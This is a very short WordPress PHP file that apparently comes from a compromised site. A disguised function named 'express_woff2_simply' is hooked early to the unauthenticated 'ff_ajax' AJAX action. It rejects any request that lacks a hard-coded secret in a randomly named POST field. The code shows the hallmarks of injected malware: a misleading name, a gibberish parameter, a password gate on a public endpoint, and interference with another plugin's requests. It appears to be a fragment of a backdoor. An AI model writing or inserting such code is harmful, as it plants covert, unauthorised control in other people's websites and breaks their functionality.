<?php

function express_woff2_simply() {
	if (!isset($_POST["eaxrzpddtgzarw"]) || $_POST["eaxrzpddtgzarw"] !== "duVaRswKLfS") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'express_woff2_simply', 5, 1);
